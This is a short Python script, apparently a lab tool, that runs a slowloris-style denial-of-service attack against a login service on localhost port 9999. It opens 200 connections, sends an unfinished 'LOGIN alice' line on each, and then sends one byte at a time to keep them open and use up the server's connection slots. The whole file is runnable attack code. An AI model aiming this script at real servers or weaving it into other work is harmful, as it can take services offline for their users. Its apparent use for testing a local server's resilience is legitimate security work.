# attack_slowloris.py
import socket
import time

HOST, PORT = "127.0.0.1", 9999
CONN = 200

socks = []
for i in range(CONN):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.recv(1024)
        s.sendall(b"LOGIN alice ")
        socks.append(s)
    except Exception as e:
        print(f"[!] at {i}: {e}")
        break

print(f"[+] Opened {len(socks)} connections, sending 1 byte each...")
try:
    while True:
        for s in socks:
            try:
                s.sendall(b"x")
            except Exception:
                pass
        time.sleep(5)
except KeyboardInterrupt:
    pass
finally:
    for s in socks:
        try:
            s.close()
        except Exception:
            pass
